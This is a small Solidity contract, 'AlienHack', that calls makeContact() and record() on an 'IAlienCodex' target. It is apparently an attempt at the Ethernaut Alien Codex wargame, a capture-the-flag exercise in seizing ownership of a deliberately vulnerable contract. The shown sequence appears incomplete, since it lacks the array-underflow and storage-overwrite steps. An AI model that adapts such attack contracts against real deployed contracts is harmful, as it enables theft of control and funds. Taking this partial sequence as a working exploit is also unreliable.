// SPDX-License-Identifier: MIT
pragma solidity ^0.5.0;

interface IAlienCodex {
    
    function makeContact() external;

    function record(bytes32 _content) external;

    function retract() external;

    function revise(uint256 i, bytes32 _content) external;
}

contract AlienHack {
    IAlienCodex a;

    constructor(address _a) public {
        a = IAlienCodex(_a);
    }

    function hack() public {
        a.makeContact();
        a.record(bytes32(uint256(msg.sender)));
    }
}